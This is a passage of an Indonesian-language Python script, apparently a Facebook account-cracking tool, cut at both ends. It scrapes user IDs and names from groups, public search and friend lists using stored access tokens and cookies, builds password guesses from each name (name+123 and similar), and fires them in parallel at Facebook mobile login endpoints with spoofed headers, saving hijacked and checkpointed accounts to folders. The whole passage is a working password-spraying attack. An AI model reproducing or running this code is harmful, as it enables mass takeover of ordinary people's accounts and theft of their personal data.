idi','ali','jaya','kiki','pian','pita','juwita','junita','nita','anisa','nisa','sani','sari','uje','uji','olip','oli','fikar','nur','siti','aji','oji','rada','imas','mia','tuti','tia','ima','sendi','febian','rima','raka','rati','jiman','dodi','reza','yani','galih','hia','siva','opik','kamal','jamal','linda','lida','ida','adi','andi','dwi','muhammad','nur','dewi','tri','dian','sri','putri','eka','sari','aditya','basuki','budi','joni','toni','cahya','riski','farhan','aden','joko','01','02','03','04','05','06','07','08','09','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','34','35','36','38','39','40','41','42','42','43','44','50','45','46','47','48','49','51','231','241','772','829','610','64','628','528','422','241','321','537','771','883','836','929','737','123','288','913','891','88','66','77','66','55','991','728','923','112','maulana','ramdani','ramadan','mulyana','irawan','susanto','saputra','sinaga','mulyono','wibowo','wirawan','hermawan','darmawan','hermanto','sulaeman','kurniawan','setiawan','sukaesih','aprilia','apriliani','rahayu','lestari','safitri','nurhasanah','fatimah','aisyah','nurjanah','khoerunisa','fadilah','ningsih','yuningsih','ningsih','nengsih','suningsih','yulianti','julianti','pertiwi','pratiwi','mulyani','wahyuni','hutagalung','suherni','damayanti','kartika','kartini','78','173','992','32','007','07','08','09','01','02','03','04','05','06','66','99','723','820','61','231','geulis','032','610','889','883','812','72','77','101','official','gaming','utama','123','1234','12345','123456','cakep','90','96','25','221','621','722','112','829','xd','ramdani','ramadani','maulana','aisyah','773','663','724','252','332','173','809','713','739','221','114','116','117','752','82','56','64','001','002','003','004','005','006','009''102','628','791','991','88','667','66']
	global ok , cp
	print(f"{m}╭───────────────────────────────────────────────────────────────────────────{b}▶")	
	sandi = input(f"{m}╰─{b}▶{b} 𝗠𝗔𝗦𝗨𝗞𝗞𝗔𝗡 𝗡𝗔𝗠𝗔 : {u}")
	if ',' in str(sandi):
		mail()
	doma = '@gmail.com'
	if '@' not in str(doma) or '.com' not in str(doma):
		mail()
	jumlah = input(f"{m}|─{b}▶{b} 𝗧𝗢𝗧𝗔𝗟 𝗚𝗘𝗧 𝗜𝗗𝗭 : {u}")
	for xyz in range(int(jumlah)):
		AA = sandi
		BB = [f'{str(rc(depan))}',f'{str(rr(1,31))}',f'{str(rc(belakang))}'f'{str(rc(depan))}{str(rr(1,31))}',f'{xyz}',f'{str(rc(belakang))}{str(rr(1,31))}',f'{str(rc(depan))}{str(rc(belakang))}']
		CC = doma
		DD = f'{AA}{str(rc(BB))}{CC}'
		if DD in id:pass
		else:id.append(DD+'|'+sandi)
		if len(dump)==999999:setting()
		sys.stdout.write(f"\r{m}╭─{b}▶{b} 𝗚𝗘𝗧𝗧𝗜𝗡𝗚 𝗜𝗗𝗭   : {u}{len(id)}");sys.stdout.flush()
		time.sleep(0.0000002)
	setting()
#----------[ CRACK FILE ]-----------#
def file():
	try:
		print(f"{m}╭───────────────────────────────────────────────────────────────────────────{b}▶")	
		fileX = input (f'{m}╰─{b}▶{b} 𝗜𝗡𝗣𝗨𝗧 𝗙𝗜𝗟𝗘 :{u} ')
		for line in open(fileX, 'r').readlines():
			id.append(line.strip())
		setting()
	except IOError:
		file()
#-----------------[ CRACK GRUP ]-----------------# 
def grup():
	try:
		token = open('.araiixyzztok.txt','r').read()
		cokies = open('.araiixyzzcok.txt','r').read()
	except IOError:
		time.sleep(5)
		login()
	print(f"{m}╭───────────────────────────────────────────────────────────────────────────{b}▶")	
	url = input(f'{m}╰─{b}▶{b} 𝗠𝗔𝗦𝗨𝗞𝗞𝗔𝗡 𝗜𝗗𝗭 𝗚𝗥𝗢𝗨𝗣 : {u}')
	kocak("https://mbasic.facebook.com/groups/"+url,cokies)
	print("\r")
	setting()

def kocak(url,cokies):
	data = parser(ses.get(url,cookies={"cookie": cokies}).text, "html.parser")
	judul = re.findall("<title>(.*?)</title>",str(data))[0]
	if str(judul) == 'Use basic mode':
		exit()
	if str(judul) == 'Epsilon':
		exit()
	if str(judul) == 'Kesalahan':
		exit()
	if str(judul) == 'Masuk Facebook' or str(judul) == 'Masuk Facebook | Facebook' or str(judul) == 'Masuk ke Facebook' or str(judul) == 'Log in to Facebook':
		exit()
	else:
		for isi in data.find_all("h3"):
			for ids in isi.find_all("a",href=True):
				if "profile.php" in ids.get("href"):uid = ids.get("href").split("=")[1].replace("&eav","");sandi = ids.text
				else:
					if ids.text==judul:pass
					else:uid = ids.get("href").split("/")[1].split("?")[0];sandi = ids.text
				if uid+"|"+sandi in id:pass
				else:id.append(uid+"|"+sandi)
				print(f'\r{m}╭─{b}▶{b} 𝗚𝗘𝗧𝗧𝗜𝗡𝗚 𝗜𝗗𝗭 𝗚𝗥𝗢𝗨𝗣  : {i}%s'%(len(id)),end='')
		for x in data.find_all("a",href=True):
			if "Lihat Postingan Lainnya" in x.text:
				kocak("https://mbasic.facebook.com"+x.get("href"),cokies)
#----------------------[ CRACK USERNAME ]----------------------#
def sandi():
	try:
		token = open('.araiixyzztok.txt','r').read()
		cokies = open('.araiixyzzcok.txt','r').read()
	except IOError:
		time.sleep(5)
		login()
	sandi = []
	custom = ['nazri','nizar','reni','aidil','yusup','yusep','sidik','encas','erika','ika','agil','lang','ling','lung','ani','keyla','septi','cepi','galuh','rona','ronaldo','ado','deon','ratu','ara','nia','nina','panji','heru','gaga','ega','agnes','ilma','puji','pujia','uji','hesti','reksa','bulan','alip','alif','sahri','raisa','mela','mella','cucu','ria','sarah','bunga','vina','cia','tiya','candra','bilal','fatimah','arya','kevin','bima','nurul','suparhan','ahmad','mahmud','asep','ramdan','saputra','kurnia','ramdani','hilda','mita','miya','ayu','gopur','tia','bono','mutiara','arin','wiwin','winda','penita','iyus','herlan','dinda','nda','naya','niya','aca','bandros','refan','wapda','rahman','maman','mimin','fitrah','adit','adat','fiki','aulia','tata','enung','esih','jajang','febi','ismi','wida','sanji','regi','rega','ferdi','firman','jimi','mawar','ratna','dimas','sasa','tia','tini','medusa','dewi','winda','setia','putri','danil','galang','gilang','denis','deni','sela','nabil','sinta','amel','melia','putra','telor','sabun','nia','kira','mela','mila','lisa','lida','lidi','ali','jaya','kiki','pian','pita','juwita','junita','nita','anisa','nisa','sani','sari','uje','uji','olip','oli','fikar','nur','siti','aji','oji','rada','imas','mia','tuti','tia','ima','sendi','febian','rima','raka','rati','jiman','dodi','reza','yani','galih','hia','siva','opik','kamal','jamal','linda','lida','ida','adi','andi','dwi','muhammad','nur','dewi','tri','dian','sri','putri','eka','sari','aditya','basuki','budi','joni','toni','cahya','riski','farhan','aden','joko']
	custom2 = ['boy','mabok','eam','aulia','kasih','cantik','kasep','ganteng','tzy','1','2','3','4','5','6','7','8','9','99','official','gaming','utama','123','1234','12345','123456','cakep','sunda']
	print(f"{m}╭───────────────────────────────────────────────────────────────────────────{b}▶")	
	nam = input(f'{m}╰─{b}▶{b} 𝗡𝗔𝗠𝗔 𝗧𝗔𝗥𝗚𝗘𝗧 : {u}').split(",")
	for ser in nam:
		for belakang in custom:
			id = ser+belakang
			sandi.append(id)
		for depan in custom2:
			id = depan+ser
			sandi.append(id)
	with tred(max_workers=5) as thread:
		for id in sandi:
			cari_sandi("https://mbasic.facebook.com/public/"+id,cokies)
	print("\r")
	setting()
		
def cari_sandi(link,cokies):
	r = parser(ses.get((str(link)),cookies={"cookie": cokies}).text, "html.parser")
	for x in r.find_all('td'):
		data = re.findall('\<a\ href\=\"\/(.*?)\">\<div\ class\=\".*?\">\<div\ class\=\".*?\">(.*?)<\/div\>',str(x))
		for uid,sandi in data:
			if 'profile.php?' in uid:
				uid = re.findall('id=(.*)',str(uid))[0]
			elif '<span' in sandi:
				sandi = re.findall('(.*?)\<',str(sandi))[0]
			bo = uid+'|'+sandi
			if bo in id:pass
			else:id.append(bo)
			sys.stdout.write(f"\r{m}╭─{b}▶{b} 𝗚𝗘𝗧𝗧𝗜𝗡𝗚 𝗜𝗗𝗭  : {u}{len(id)}");sys.stdout.flush()
			time.sleep(0.0000002)
		if "Lihat Hasil Selanjutnya" in x.text:
			cari_sandi("https://mbasic.facebook.com"+x.get("href"),cokies)
			
				
#-----------------[ HASIL-CRACK ]-----------------#
def result():
	print(f"{m}╭───────────────────────────────────────────────────────────────────────────{u}▶")	
	print(f'{m}╰─{b}▶{u}[{b}A{u}]{m}.{b}𝗛𝗔𝗦𝗜𝗟 {u}𝗢𝗞')
	print(f'{m}╰─{b}▶{u}[{b}B{u}]{m}.{k}𝗛𝗔𝗦𝗜𝗟 {m}𝗖𝗣')
	print(f"{m}╭───────────────────────────────────────────────────────────────────────────{u}▶")	
	kz = input(f'{m}╰─{b}▶{b} 𝗣𝗜𝗟𝗜𝗛 :{u} ')
	if kz in ['b','B']:		
		try:vin = os.listdir('CP')
		except FileNotFoundError:
			time.sleep(3)
			back()
		if len(vin)==0:
			time.sleep(2)
			back()
		else:
			cih = 0
			lol = {}
			for isi in vin:
				try:hem = open('CP/'+isi,'r').readlines()
				except:continue
				cih+=1
				if cih<999999999:
					nom = ''+str(cih)
					lol.update({str(cih):str(isi)})
					lol.update({nom:str(isi)})
					print(f"{m}╭───────────────────────────────────────────────────────────────────────────{u}▶")	
					print(f'{m}╰─{b}▶{k}[%s{k}] [{m}%s{k}] [{m}%s{k}] [{m}𝗔𝗞𝗨𝗡{k}]'%(nom,isi,len(hem)))
				else:
					lol.update({str(cih):str(isi)})
					print('['+str(cih)+'] '+isi+f' {m}'+str(len(hem))+f' {m}𝗔𝗞𝗨𝗡'+x)
			print(f"{m}╭───────────────────────────────────────────────────────────────────────────{u}▶")	
			geeh = input(f'{m}╰─{b}▶{k} 𝗣𝗜𝗟𝗜𝗛 :{m} ')
			
			try:geh = lol[geeh]
			except KeyError:
				back()
			try:lin = open('CP/'+geh,'r').read().splitlines()
			except:
				time.sleep(2)
				back()
			nocp=0
			for cpku in range(len(lin)):
				cpkuni=lin[nocp].split('|')
				print(f"{m}╭───────────────────────────────────────────────────────────────────────────{u}▶")	
				print(f'{m}╰─{b}▶{k}[{m}{cpkuni[0]}{k}]{u}│{k}[{m}{cpkuni[1]}{k}]')
				nocp +=1
			print(f"{m}╭───────────────────────────────────────────────────────────────────────────{u}▶")	
			input(f'{m}╰─{b}▶{k} 𝗘𝗡𝗧𝗘𝗥 𝗙𝗢𝗥 𝗕𝗔𝗖𝗞')
			back()
	elif kz in ['a','A']:		
		try:vin = os.listdir('OK')
		except FileNotFoundError:
			back()
		if len(vin)==0:
			back()
		else:
			cih = 0
			lol = {}
			for isi in vin:
				try:hem = open('OK/'+isi,'r').readlines()
				except:continue
				cih+=1
				if cih<99999999:
					nom = ''+str(cih)
					lol.update({str(cih):str(isi)})
					lol.update({nom:str(isi)})
					print(f"{m}╭───────────────────────────────────────────────────────────────────────────{u}▶")	
					print(f'{m}╰─{u}▶{b}[{u}%s{b}] [{u}%s{b}] {b}[{u}%s{b}] {b}[{u}𝗔𝗞𝗨𝗡{b}]'%(nom,isi,len(hem)))
				else:
					lol.update({str(cih):str(isi)})
					print(f'{m}╰─{b}▶{b}[{u}%s{b}] [{u}%s{b}] [{u}%s{b}] [{u}𝗔𝗞𝗨𝗡{b}]'%(cih,isi,(len(hem))))
			print(f"{m}╭───────────────────────────────────────────────────────────────────────────{u}▶")	
			geeh = input(f'{m}╰─{b}▶{b} 𝗣𝗜𝗟𝗜𝗛 :{u} ')
			
			try:geh = lol[geeh]
			except KeyError:
				back()
			try:lin = open('OK/'+geh,'r').read().splitlines()
			except:
				back()
			nocp=0
			for cpku in range(len(lin)):
				cpkuni=lin[nocp].split('|')
				print(f"{m}╭───────────────────────────────────────────────────────────────────────────{u}▶")	
				print(f'{m}╰─{b}▶{b}[{u}{cpkuni[0]}{b}]{u}│{b}[{u}{cpkuni[1]}{b}]')
				nocp +=1
			print(f"{m}╭───────────────────────────────────────────────────────────────────────────{u}▶")	
			input(f'{m}╰─{b}▶{b} 𝗘𝗡𝗧𝗘𝗥 𝗙𝗢𝗥 𝗕𝗔𝗖𝗞')
			back()
#-----------------[ NGEDUMP ID ]-----------------#			
def ngedumpid():
	try:
		tok = open('.araiixyzztok.txt','r').read()
		cok = {'cookie': open('.araiixyzzcok.txt','r').read()}
	except(FileNotFoundError):
		time.sleep(3)
		login()
	if data['Author'] == 'ARAIIXYZZ':pass
	try:
		params = {
		  'access_token': tok,
		  'fields': 'name,id'
		}
		po = ses.get('https://graph.facebook.com/me', params = params , cookies = cok).json()
	except(KeyError):
		time.sleep(3)
		login()
	try:
		print(f"{m}╭───────────────────────────────────────────────────────────────────────────{b}▶")	
		uid = input(f"{m}╰─{b}▶{b} 𝗜𝗗𝗭 𝗧𝗔𝗥𝗚𝗘𝗧 :{u} ").split(',')
		if uid in ['' , ' ']:
			ngedumpid()
		print(f"{m}╭───────────────────────────────────────────────────────────────────────────{b}▶")	
		print(f'{m}╰─{b}▶{b} 𝗧𝗘𝗞𝗔𝗡  {u}𝗖𝗧𝗥𝗟 {b}+{u} 𝗖 {b}𝗙𝗢𝗥 𝗦𝗧𝗢𝗣 ')
		print(f"{m}╭───────────────────────────────────────────────────────────────────────────{b}▶")	
		for i in uid:
			dumping(i , '' , tok , cok)
	except(KeyboardInterrupt) as e:
		loop = 0
		print(' ')
		print(f"{m}╭───────────────────────────────────────────────────────────────────────────{b}▶")	
		print(f'{m}╰─{b}▶{b} 𝗗𝗜 𝗔𝗪𝗔𝗟𝗜 {u}/sdcard/')
		print(f'{m}|─{b}▶{b} 𝗖𝗢𝗡𝗧𝗜𝗝 𝗙𝗜𝗟𝗘 𝗩1 : {u}/sdcard/araiixyzz.txt ')
		print(f'{m}╭─{b}▶{b} 𝗖𝗢𝗡𝗧𝗢𝗛 𝗙𝗜𝗟𝗘 𝗩2 : {u}/sdcard/folder/araiixyzz.txt ')
		print(f"{m}╰───────────────────────────────────────────────────────────────────────────{b}▶")	
		print(f"{m}╭───────────────────────────────────────────────────────────────────────────{b}▶")	
		file = input(f'{m}╰─{b}▶{b} 𝗡𝗔𝗠𝗔 𝗙𝗜𝗟𝗘 :{u} ')
		print(f"{m}╭───────────────────────────────────────────────────────────────────────────{b}▶")	
		print(f'{m}╰─{b}▶{u}[{b}A{u}]{m}.{b}𝗦𝗔𝗩𝗘 𝗜𝗗 {u}𝗢𝗟𝗗 ')
		print(f'{m}|─{b}▶{u}[{b}B{u}]{m}.{b}𝗦𝗔𝗩𝗘 𝗜𝗗 {u}𝗡𝗘𝗪 ')
		print(f'{m}╭─{b}▶{u}[{b}C{u}]{m}.{b}𝗦𝗔𝗩𝗘 𝗜𝗗 {u}𝗥𝗔𝗡𝗗𝗢𝗠 ')
		print(f"{m}╰───────────────────────────────────────────────────────────────────────────{b}▶")	
		print(f"{m}╭───────────────────────────────────────────────────────────────────────────{b}▶")	
		pisah = input(f'{m}╰─{b}▶{b} 𝗣𝗜𝗟𝗜𝗛 :{u} ')
		if pisah in ['a','A']:
			for x in uid3:
				id = x.split('|')[0]
				if len(id)<11:
					loop+=1
					cetak('[bold red]•─[bold cyan]▶[bold cyan] 𝗠𝗘𝗡𝗚𝗨𝗠𝗣𝗨𝗟𝗞𝗔𝗡 {}|{} 𝗜𝗗𝗭'.format(id,loop) , end = ' \r');time.sleep(0.0007)
					with open(file , 'a') as araiixyzz:
						araiixyzz.write(x +'\n')
			print(f"{m}╭───────────────────────────────────────────────────────────────────────────{b}▶")	
			cetak('[bold red]╰─[bold cyan]▶[bold cyan] 𝗗𝗨𝗠𝗣 𝗦𝗔𝗩𝗘 𝗜𝗡[bold cyan]{}'.format(file))
		elif pisah in ['b','B']:
			for x in uid3:
				id = x.split('|')[0]
				if len(id)<11:
					pass
				else:
					if len(id)<15:
						loop+=1
						cetak('[bold red]•─[bold cyan]▶[bold cyan] 𝗠𝗘𝗡𝗚𝗨𝗠𝗣𝗨𝗟𝗞𝗔𝗡 {}|{} 𝗜𝗗𝗭'.format(id,loop) , end = ' \r');time.sleep(0.0007)
						with open(file , 'a') as araiixyzz:
							araiixyzz.write(x +'\n')
			print(f"{m}╭───────────────────────────────────────────────────────────────────────────{b}▶")	
			cetak('[bold red]╰─[bold cyan]▶[bold cyan] 𝗗𝗨𝗠𝗣 𝗦𝗔𝗩𝗘 𝗜𝗡[bold cyan]{}'.format(file))
		elif pisah in ['c','C']:
			for x in uid3:
				loop+=1
				id = x.split('|')[0]
				cetak('[bold red]•─[bold cyan]▶[bold cyan] 𝗠𝗘𝗡𝗚𝗨𝗠𝗣𝗨𝗟𝗞𝗔𝗡 {}|{} 𝗜𝗗𝗭'.format(id,loop) , end = ' \r');time.sleep(0.0007)
				with open(file , 'a') as araiixyzz:
					araiixyzz.write(x +'\n')
			print(f"{m}╭───────────────────────────────────────────────────────────────────────────{b}▶")	
			cetak('[bold red]╰─[bold cyan]▶[bold cyan] 𝗗𝗨𝗠𝗣 𝗦𝗔𝗩𝗘 𝗜𝗡 [bold cyan]{}'.format(file))
		else:
			for x in uid3:
				id = x.split('|')[0]
				for tahun in pisah.split(','):
					if id[0:5]==tahun:
						loop+=1
						cetak('[bold green]•─[bold cyan]▶[bold cyan] 𝗠𝗘𝗡𝗚𝗨𝗠𝗣𝗨𝗟𝗞𝗔𝗡 {}|{} 𝗜𝗗𝗭'.format(id,loop) , end = ' \r');time.sleep(0.0007)
						with open(file , 'a') as araiixyzz:
							araiixyzz.write(x +'\n')
			print(f"{m}╭───────────────────────────────────────────────────────────────────────────{b}▶")	
			cetak('[bold green]╰─[bold cyan]▶[bold cyan] 𝗗𝗨𝗠𝗣 𝗧𝗘𝗥𝗦𝗜𝗠𝗣𝗔𝗡 𝗗𝗜 [bold green]{}'.format(file))

def dumping(uidz , after , tok , cok):#> Buat Dump Uid
	try:
		if data['Author'] == 'ARAIIXYZZ':pass
		else:cetak('[bold white]([bold red]x[bold white]) 𝗔𝗥𝗔𝗜𝗜𝗫𝗬𝗭𝗭');exit()
		if len(uid)==0:
			params = {
			  'access_token': tok,
			  'fields': 'friends'
			}
		else:
			params = {
			  'access_token': tok,
			  'fields': 'friends.after({})'.format(after)
			}
		po = ses.get('https://graph.facebook.com/{}'.format(uidz) , params = params , cookies = cok).json()
		for x in po['friends']['data']:
			try:
				berkelanjutan(str(x.get('id')) , '' , tok , cok)
				uid.append(str(x.get('id')))
			except(KeyError):
				pass
		afr = po['friends']['paging']['cursors']['after']
		dumping(uidz , afr , tok , cok)
	except(KeyError) as e:
		if len(uid3)==0:
			cetak('[bold red]•─[bold cyan]▶[bold yellow] 𝗜𝗗 𝗧𝗔𝗥𝗚𝗘𝗧 𝗧𝗜𝗗𝗔𝗞 𝗣𝗨𝗕𝗟𝗜𝗞')
		else:
			cetak('[bold red]•─[bold cyan]▶[bold cyan] 𝗞𝗘𝗦𝗔𝗟𝗔𝗛𝗔𝗡 𝗧𝗘𝗥𝗝𝗔𝗗𝗜 [bold red]{}'.format(e))
			Console().input('[bold green]•─[bold cyan]▶[bold cyan] 𝗖𝗢𝗢𝗞𝗜𝗘 𝗞𝗔𝗗𝗔𝗟𝗨𝗔𝗥𝗦𝗔')
		
def berkelanjutan(uidz , after2 , tok , cok):#> Dump Sesi 2
	if len(uid2)==0:
		params = {
		  'access_token': tok,
		  'fields': 'friends'
		}
	else:
		params = {
		  'access_token': tok,
		  'fields': 'friends.after({})'.format(after2)
		}
	po2 = ses.get('https://graph.facebook.com/{}'.format(uidz) , params = params , cookies = cok).json()
	if 'paging' in po2['friends']:
		for x in po2['friends']['data']:
			uid2.append(str(x.get('id')))
			uid3.append(str(x.get('id'))+'|'+str(x.get('name')))
		cetak('[bold red]•─[bold cyan]▶[bold cyan] 𝗠𝗘𝗡𝗚𝗨𝗠𝗣𝗨𝗟𝗞𝗔𝗡 {}|{} 𝗜𝗗𝗭'.format(str(x.get('id')) , len(uid3)) , end = ' \r')
	else:
		uid2.clear()
	afr2 = po2['friends']['paging']['cursors']['after']
	berkelanjutan(uidz , afr2 , tok , cok)
					
#-------------[ PILIHAN USIA AKUN ]---------------#
def setting():
	print(" ")
	print(f"{m}╰───────────────────────────────────────────────────────────────────────────{b}▶")	
	usia = 'random'
	if usia in ['random']:
		for acak in id:
			bebas = random.randint(0,len(id2))
			id2.insert(bebas,acak)
	else:
		exit()
	print(f"{m}╭───────────────────────────────────────────────────────────────────────────{b}▶")			
	print(f"{m}╰─{b}▶{u}[{b}A{u}]{m}.{b}𝗩𝗔𝗟𝗜𝗗𝗔𝗧𝗘")
	print(f"{m}|─{b}▶{u}[{b}B{u}]{m}.{b}𝗠𝗕𝗔𝗦𝗜𝗖")
	print(f"{m}╭─{b}▶{u}[{b}C{u}]{m}.{b}𝗔𝗦𝗬𝗡𝗖")
	print(f"{m}╰───────────────────────────────────────────────────────────────────────────{b}▶")	
	print(f"{m}╭───────────────────────────────────────────────────────────────────────────{b}▶")	
	araii = input(f'{m}╰─{b}▶{b} 𝗣𝗜𝗟𝗜𝗛 : {u}')
	if araii in ['a','A']:
		method.append('validate')
	elif araii in ['b','B']:
		method.append('mobile')
	elif araii in ['c','C']:
		method.append('asin')
	else:
		method.append('validate')
	print(f"{m}╭───────────────────────────────────────────────────────────────────────────{b}▶")	
	print(f"{m}╰─{b}▶          {b} 𝗖𝗥𝗔𝗖𝗞𝗜𝗡𝗚 𝗗𝗜 𝗠𝗨𝗟𝗔𝗨 𝗝𝗔𝗡𝗚𝗔𝗡 𝗟𝗨𝗣𝗔 𝗠𝗔𝗜𝗡𝗞𝗔𝗡 {u}𝗠𝗢𝗗𝗘 𝗣𝗘𝗦𝗔𝗪𝗔𝗧 ")
	print(f"{m}╭───────────────────────────────────────────────────────────────────────────{b}▶")	
	password()
#-------------------[ BAGIAN-WORDLIST ]------------#
def password():
	with tred(max_workers=30) as pool:
		for araiixyzz in id2:
			idf,sandi = araiixyzz.split('|')[0],araiixyzz.split('|')[1].lower()
			sandi = sandi.split(' ')[0]
			urutan = []
			if len(sandi)<6:
				if len(sandi)<3:
					pass
				else:
					urutan.append(sandi)
					urutan.append(sandi+'12')
					urutan.append(sandi+'123')
					urutan.append('kamu nanya')
			else:
				if len(sandi)<3:
					urutan.append(sandi)
					urutan.append('kamu nanya')
				else:
					urutan.append(sandi)
					urutan.append(sandi+'01')
					urutan.append(sandi+'12')
					urutan.append(sandi+'123')
					urutan.append(sandi+'1234')
					urutan.append(sandi+'12345')
					urutan.append(sandi+'123456')
					urutan.append(sandi+'321')
					urutan.append('kamu nanya')
			if 'ya' in pwpluss:
				for sandi in pwnya:
					urutan.append(sandi)
			else:pass
			if 'validate' in method:
				pool.submit(validate,idf,urutan,'m.facebook.com')
			elif 'mobile' in method:
				pool.submit(mobile,idf,urutan,'mbasic.facebook.com')
			elif 'asin' in method:
				pool.submit(asin,idf,urutan,'m.latest.facebook.com')
			else:
				pool.submit(validate,idf,urutan,'m.facebook.com')
	print(" ")
	print(f"{m}╭───────────────────────────────────────────────────────────────────────────{b}▶")	
	print(f"{m}╰─{b}▶{b} 𝗖𝗥𝗔𝗖𝗞 {u}𝗦𝗘𝗟𝗘𝗦𝗔𝗜 ")
	print(f"{m}╭───────────────────────────────────────────────────────────────────────────{b}▶")	
	print(f"{m}╰─{b}▶{b} 𝗛𝗔𝗦𝗜𝗟 𝗢𝗞 : {u}{ok} ")
	print(f"{m}╭─{b}▶{k} 𝗛𝗔𝗦𝗜𝗟 𝗖𝗣 : {m}{cp}")
	print(f"{m}╰───────────────────────────────────────────────────────────────────────────{b}▶")	
	print(f"{m}╭───────────────────────────────────────────────────────────────────────────{b}▶")	
	print(f"{m}╰─{b}▶{b} ( {u}𝗬 {b}) 𝗟𝗔𝗡𝗝𝗨𝗧 ( {m}𝗧 {b}) 𝗕𝗘𝗥𝗛𝗘𝗡𝗧𝗜")
	print(f"{m}╭───────────────────────────────────────────────────────────────────────────{b}▶")	
	woi = input(f"{m}╰─{b}▶{b} 𝗣𝗜𝗟𝗜𝗛 : {u}")
	if woi in ['y','Y']:
		print(f"{m}╭───────────────────────────────────────────────────────────────────────────{b}▶")
		print(f"{m}╰─{b}▶{b} 𝗞𝗔𝗦𝗜 𝗟𝗔𝗣𝗢𝗥𝗔𝗡 𝗞𝗘 𝗚𝗪 𝗞𝗜𝗡𝗞 𝗛𝗔𝗦𝗜 𝗡𝗬𝗔 ")
		time.sleep(3)
		os.system("xdg-open http://wa.me//6282371111202?text=Bang+Saya+mau+laporan+hasil+crack")	
		os.system('clear')
		back()
	else:
		print(f"{m}╭───────────────────────────────────────────────────────────────────────────{b}▶")	
		print(f"{m}╰─{b}▶{b} 𝗞𝗔𝗦𝗜 𝗟𝗔𝗣𝗢𝗥𝗔𝗡 𝗞𝗘 𝗚𝗪 𝗞𝗜𝗡𝗞 𝗛𝗔𝗦𝗜 𝗡𝗬𝗔")
		time.sleep(2)
		os.system("xdg-open http://wa.me//6282371111202?text=Bang+Saya+mau+laporan+hasil+crack")
		exit()
#--------------------[VALIDATE]-----------------#
def validate(idf,urutan,url):
	global loop,ok
	bo = random.choice([m,b,k,h,u])
	sys.stdout.write(f"\r{m}╰─{b}▶{b} 𝗩𝗔𝗟𝗜𝗗𝗔𝗧𝗘 {u}[{bo}{loop}{u}/{bo}{len(id)}{u}]—{u}[{b}{ok}{u}]—{u}[{k}{cp}{u}]—[{bo}{'{:.0%}'.format(loop/float(len(id)))}{u}]  "),
	sys.stdout.flush()
	rr = random.randint
	rc = random.choice 
	ua = random.choice(ugen)
	ses = requests.Session()
	for pw in urutan:
		try:
			link = ses.get('https://m.facebook.com/login.php?skip_api_login=1&api_key=263024851086804&kid_directed_site=0&app_id=263024851086804&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv6.0%2Fdialog%2Foauth%3Fapp_id%3D263024851086804%26cbt%3D1694947427324%26channel_url%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df2caaa9ef1d62%2526domain%253Dwww.clipclaps.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fwww.clipclaps.com%25252Ff22a82d3dc29da%2526relation%253Dopener%26client_id%3D263024851086804%26display%3Dtouch%26domain%3Dwww.clipclaps.com%26e2e%3D%257B%257D%26fallback_redirect_uri%3Dhttps%253A%252F%252Fwww.clipclaps.com%252F%26locale%3Den_US%26logger_id%3Df315dddb307318%26origin%3D2%26redirect_uri%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df6bbec4a9f1f68%2526domain%253Dwww.clipclaps.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fwww.clipclaps.com%25252Ff22a82d3dc29da%2526relation%253Dopener%2526frame%253Dfe6c5cc684b72c%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26sdk%3Djoey%26version%3Dv6.0%26refsrc%3Ddeprecated%26ret%3Dlogin%26fbapp_pres%3D0%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df6bbec4a9f1f68%26domain%3Dwww.clipclaps.com%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fwww.clipclaps.com%252Ff22a82d3dc29da%26relation%3Dopener%26frame%3Dfe6c5cc684b72c%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr')
			data = {
'lsd': re.search('name="lsd" value="(.*?)"',str(link.text)).group(1),
'jazoest': re.search('name="jazoest" value="(.*?)"',str(link.text)).group(1),
'm_ts': re.search('name="m_ts" value="(.*?)"',str(link.text)).group(1),
'li': re.search('name="li" value="(.*?)"',str(link.text)).group(1),
'try_number': 0,
'unrecognized_tries': 0,
'email':idf,
'pass':pw,
'login':'Masuk',
'prefill_contact_point': '',
'prefill_source': '',
'prefill_type': '',
'first_prefill_source': '',
'first_prefill_type': '',
'had_cp_prefilled': False,
'had_password_prefilled': False,
'is_smart_lock': False,
'bi_xrwh': 0
}
			headers = {'Host': 'm.facebook.com','x-fb-rlafr': '0','access-control-allow-origin': '*','strict-transport-security': 'max-age=15552000; preload','pragma': 'no-cache','cache-control': 'private, no-cache, no-store, must-revalidate','x-fb-debug': 'J9sEtS6VttXEZAdcwAFuSgNaCOI+M5AmEWyzsFKgRS5OcUfo5ViX/5Z7oCmzHaEUfZRLKdk3pnc2r3/ttOBDEg==','content-length': '0','cache-control': 'max-age=0','sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','save-data': 'on','upgrade-insecure-requests': '1','origin': 'https://m.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-user': '?1','sec-fetch-dest': 'empity','referer': 